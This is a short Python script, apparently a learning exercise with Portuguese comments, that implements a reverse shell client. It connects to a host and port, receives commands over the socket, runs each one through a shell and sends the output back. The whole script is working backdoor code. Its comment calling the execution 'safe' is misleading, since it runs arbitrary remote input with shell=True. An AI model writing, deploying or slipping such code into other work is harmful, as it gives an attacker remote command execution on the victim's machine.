import socket
import os
import subprocess

host = "127.0.0.1"
port = 5100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    try:
        command = s.recv(4096).decode().strip()
        if not command:
            continue  # nada a executar

        # Executa o comando com segurança
        try:
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            result = e.output  # captura saída mesmo em erro

        # Envia apenas se houver saída significativa
        if result.strip():
            s.send(result.encode())
    except Exception as e:
        # Envia mensagem de erro
        s.send(f"[!] Erro: {e}".encode())
